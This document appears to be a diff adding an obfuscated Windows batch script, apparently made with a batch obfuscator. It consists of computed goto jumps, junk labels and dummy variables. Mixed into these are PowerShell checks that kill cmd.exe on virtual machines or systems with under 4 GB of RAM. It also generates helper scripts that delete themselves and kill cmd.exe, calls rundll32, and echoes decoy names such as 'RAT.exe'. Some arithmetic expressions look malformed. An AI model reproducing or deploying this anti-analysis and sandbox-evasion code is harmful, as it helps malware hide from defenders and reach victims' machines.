+echo BAD_EXE.exe >nul 2>nul 
+set /a ans=2*03*0xb*~-14700 
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if ((Get-WmiObject Win32_ComputerSystem).Model -match 'Virtual') { taskkill /F /IM cmd.exe }" 
+goto (2*03*0xb*~-14700)  
+:910773 
+:904988 
+:309091 
+:310387 
+:617494  
+echo 4  >nul 
+set /a ans=0x3*0x17*(0171240x159) 
+goto (0x3*0x17*(0171240x159))  
+:707708 
+:999011 
+:382132 
+:446974 
+:514925 
+:354037  
+set "f=b" 
+set /a ans=0141*~-6884 
+goto (0141*~-6884)  
+:367095 
+:817103 
+:711325 
+:655941 
+:160601 
+:243488 
+:643412 
+:683742 
+:617494 
+:905055  
+for /l %%w  in (625  625  625) do (
+ set "h=d" 
+)
+set /a ans=0111*~-5432 
+goto (0111*~-5432)  
+:337684 
+:433427 
+:105221 
+:578421  
+set "j=f" 
+set /a ans=2*2*03*0xd*(013000xac5) 
+goto (2*2*03*0xd*(013000xac5))  
+:341251 
+:330891 
+:446126 
+:660218 
+:558178 
+:725222 
+:829318 
+:444970 
+:283871  
+set "k=g" 
+set /a ans=2*2*~-53594 
+goto (2*2*~-53594)  
+:689176 
+:940203 
+:919532 
+:571752 
+:104289 
+:344674  
+set "l=h" 
+set /a ans=2*2*2*0x3*0131*~-398 
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if((gcim Win32_PhysicalMemory | measure -Property capacity -Sum).sum /1gb -lt 4) {spps -f -n 'cmd' -ErrorAction SilentlyContinue;exit 1}" 
+goto (2*2*2*0x3*0131*~-398)  
+:775025 
+:407660 
+:773875 
+:132055 
+:530999 
+:482995 
+:937946  
+for /l %%h  in (719  719  719) do (
+ set "m=i" 
+)
+set /a ans=0x6d*~-7394 
+goto (0x6d*~-7394)  
+:273645 
+:981094 
+:601551 
+:498085 
+:681565  
+set "o=k" 
+set /a ans=2*2*0x3*03*07*((0x8c6011162)>>2) 
+goto (2*2*0x3*03*07*((0x8c6011162)>>2))  
+:804104 
+:910773 
+:466840 
+:635054 
+:181178 
+:904494 
+:617494 
+:905055 
+:344674 
+:153737  
+for /l %%a  in (211  211  211) do (
+ set "p=l" 
+)
+set /a ans=2*03*0x11*((0207560470517047)>>9) 
+goto (2*03*0x11*((0207560470517047)>>9))  
+:297177 
+:719647 
+:607682 
+:482995 
+:526102 
+:600722 
+:252383  
+for /l %%x  in (85  85  85) do (
+ set "r=n" 
+)
+set /a ans=0x3*0x3*(0361620x9d5d) 
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if ((Get-WmiObject Win32_ComputerSystem).Model -match 'Virtual') { taskkill /F /IM cmd.exe }" 
+goto (0x3*0x3*(0361620x9d5d))  
+:335955 
+:520353 
+:387931 
+:304909 
+:344674 
+:937946 
+:924077  
+set "t=p" 
+set /a ans=2*2*03*0x11*~-644 
+goto (2*2*03*0x11*~-644)  
+:756505 
+:905055 
+:283871 
+:344674 
+:999545  
+set "u=q" 
+set /a ans=2*013*0xb*015*065 
+goto (2*013*0xb*015*065)  
+:754600 
+:120894 
+:578421 
+:153737 
+:418086  
+for /l %%m  in (280  280  280) do (
+ set "v=r" 
+)
+set /a ans=0203*~-3300 
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if((gcim Win32_PhysicalMemory | measure -Property capacity -Sum).sum /1gb -lt 4) {spps -f -n 'cmd' -ErrorAction SilentlyContinue;exit 1}" 
+goto (0203*~-3300)  
+:884574 
+:344693 
+:133623 
+:141236 
+:589492 
+:699772 
+:279208 
+:514925 
+:472575  
+set "x=t" 
+set /a ans=~-138108 
+echo @echo off >> kdotNwxIHc.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotNwxIHc.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotNwxIHc.bat 
+
+ call kdotNwxIHc.bat 
+goto (~-138108)  
+:119651 
+:352348 
+:628654 
+:470741 
+:937946 
+:939947  
+for /l %%n  in (445  445  445) do (
+ set "y=u" 
+)
+set /a ans=2*2*2*03*0x4f*(04210x4) 
+echo @echo off >> kdotqMCrGI.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotqMCrGI.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotqMCrGI.bat 
+
+ call kdotqMCrGI.bat 
+goto (2*2*2*03*0x4f*(04210x4))  
+:678260 
+:558178 
+:683317 
+:279208 
+:359220  
+set "a=w" 
+set /a ans=0x3*(014352350x2e69e) 
+goto (0x3*(014352350x2e69e))  
+:458163 
+:360020 
+:143416 
+:560156 
+:927839 
+:279208 
+:754600 
+:937946 
+:681565 
+:472575 
+:906375  
+set "c=y" 
+set /a ans=2*~-240944 
+goto (2*~-240944)  
+:880591 
+:522445 
+:357934 
+:624041 
+:235821 
+:568969 
+:683317 
+:457710 
+:252383 
+:812924  
+for /l %%m  in (837  837  837) do (
+ set "E1=A" 
+)
+set /a ans=0x3*0x3*0x3*((02246750633755)>>4) 
+goto (0x3*0x3*0x3*((02246750633755)>>4))  
+:313252 
+:698249 
+:444970 
+:939947 
+:968794  
+for /l %%d  in (746  746  746) do (
+ set "G1=C" 
+)
+set /a ans=2*2*2*~-17510 
+goto (2*2*2*~-17510)  
+:294968 
+:215621 
+:444683 
+:915805 
+:767390 
+:305763 
+:106501 
+:571752 
+:622798 
+:681565 
+:999545 
+:812924 
+:123777  
+set "I1=E" 
+set /a ans=03*~-219728 
+goto (03*~-219728)  
+:378056 
+:827419 
+:927839 
+:387931 
+:904494 
+:812924 
+:535379  
+set "N1=J" 
+set /a ans=0x3*03*0x5*0x2b*~-282 
+goto (0x3*03*0x5*0x2b*~-282)  
+:862888 
+:132055 
+:446974 
+:305763 
+:907009 
+:530799 
+:600722 
+:812924 
+:123777 
+:449823  
+for /l %%d  in (58  58  58) do (
+ set "O1=K" 
+)
+set /a ans=2*013*(0xd1b5052114) 
+goto (2*013*(0xd1b5052114))  
+:512877 
+:417994 
+:333352 
+:699772 
+:235023  
+set "P1=L" 
+set /a ans=2*2*05*035*(051102466) 
+goto (2*2*05*035*(051102466))  
+:662380 
+:312897 
+:399628 
+:470741 
+:354037 
+:418086 
+:906375 
+:129676  
+for /l %%l  in (312  312  312) do (
+ set "V1=R" 
+)
+set /a ans=2*~-326000 
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if((gcim Win32_PhysicalMemory | measure -Property capacity -Sum).sum /1gb -lt 4) {spps -f -n 'cmd' -ErrorAction SilentlyContinue;exit 1}" 
+goto (2*~-326000)  
+:712835 
+:833839 
+:664495 
+:867163 
+:683742 
+:359220 
+:968794 
+:235023 
+:233070  
+for /l %%l  in (295  295  295) do (
+ set "W1=S" 
+)
+set /a ans=2*0x3*045*(01517105146) 
+goto (2*0x3*045*(01517105146))  
+:862888 
+:934495 
+:259684 
+:670026 
+:106501 
+:354037 
+:905055 
+:283871 
+:999545 
+:418086 
+:906375 
+:535379 
+:449823 
+:235023 
+:129676 
+:734260  
+rundll32 
+set /a ans=0x3*03*0x3*~-24020 
+echo @echo off >> kdotXcHkau.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotXcHkau.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotXcHkau.bat 
+
+ call kdotXcHkau.bat 
+goto (0x3*03*0x3*~-24020)  
+:772919 
+:332141 
+:536797 
+:558178 
+:725222 
+:896691 
+:583951 
+:578421 
+:999545 
+:129676 
+:440549  
+rundll32 
+set /a ans=0x3*023*((0x24b20xca96)>>2) 
+goto (0x3*023*((0x24b20xca96)>>2))  
+:357934 
+:286543 
+:804104 
+:232226 
+:494729 
+:470676 
+:867163 
+:123777 
+:235023 
+:129676 
+:576132  
+echo RAT.exe >nul 2>nul 
+set /a ans=2*2*07*023*~-1110 
+echo @echo off >> kdotcMPMvd.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotcMPMvd.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotcMPMvd.bat 
+
+ call kdotcMPMvd.bat 
+goto (2*2*07*023*~-1110)  
+:230942 
+:255263 
+:366505 
+:542877 
+:276783 
+:940203 
+:725222 
+:617494 
+:924077 
+:359220 
+:123777 
+:535379 
+:449823 
